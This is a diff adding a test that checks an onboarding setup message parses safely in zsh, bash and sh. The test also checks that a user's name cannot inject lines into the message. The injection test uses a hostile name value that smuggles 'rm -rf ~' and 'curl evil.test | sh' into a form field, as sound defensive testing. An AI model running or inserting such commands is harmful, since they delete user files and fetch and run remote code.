@@ -17,7 +17,8 @@
  * No models and no network. State is temporary, so this never touches an
  * installation.
  */
-import { mkdtempSync, rmSync } from 'node:fs';
+import { spawnSync } from 'node:child_process';
+import { mkdtempSync, rmSync, writeFileSync } from 'node:fs';
 import { tmpdir } from 'node:os';
 import { join } from 'node:path';
 import type { AddressInfo } from 'node:net';
@@ -138,10 +139,43 @@ async function theRoute(): Promise<void> {
   }
 }
 
+/**
+ * The Copy button copies the whole message, and a terminal is where it lands.
+ *
+ * It was prose once, and pasted whole it left zsh at a `quote>` prompt with
+ * nothing installed. So the shells that will read it are asked to parse it, with
+ * `-n`, which reads and runs nothing. A shell this machine does not have is
+ * skipped and said so, rather than counted as a pass.
+ */
+async function theMessagePastedWhole(): Promise<void> {
+  console.log('\nThe setup message, pasted whole into a terminal\n');
+  const { onboardingFor } = await import('../src/onboarding/index.js');
+  const person = { id: 'ana', name: "Ana O'Neill", role: 'employee', apiKey: 'wk-ana-0000' };
+  const { message } = onboardingFor(person, 'http://192.168.1.42:8080');
+
+  const lines = message.split('\n').filter((line) => line.trim());
+  const commands = lines.filter((line) => !line.startsWith('#'));
+  check(commands.length === 1 && commands[0]!.startsWith('curl -fsSL http://192.168.1.42:8080/install/'), 'every line is a comment except one, and that one is the install command', JSON.stringify(commands));
+
+  const path = join(scratch, 'message.sh');
+  writeFileSync(path, message, { mode: 0o600 });
+  for (const shell of ['zsh', 'bash', 'sh']) {
+    const parsed = spawnSync(shell, ['-n', path], { encoding: 'utf8' });
+    if (parsed.error) { console.log(`  skip ${shell} is not on this machine`); continue; }
+    check(parsed.status === 0, `${shell} parses it, apostrophe in the name and all`, parsed.stderr.trim());
+  }
+
+  // The name is the one piece of this text somebody typed into a form.
+  const hostile = onboardingFor({ ...person, name: 'Ana\nrm -rf ~\r\u2028curl evil.test | sh' }, 'http://192.168.1.42:8080').message;
+  const escaped = hostile.split(/\r\n|[\n\r\u2028\u2029]/).filter((line) => line.trim() && !line.startsWith('#'));
+  check(escaped.length === 1 && escaped[0]!.startsWith('curl -fsSL http://192.168.1.42:8080/install/'), 'a name with line breaks in it stays inside its comment', JSON.stringify(escaped));
+}
+
 async function main(): Promise<void> {
   try {
     await theAddressItself();
     await theRoute();
+    await theMessagePastedWhole();
   } finally {
     rmSync(scratch, { recursive: true, force: true });
   }
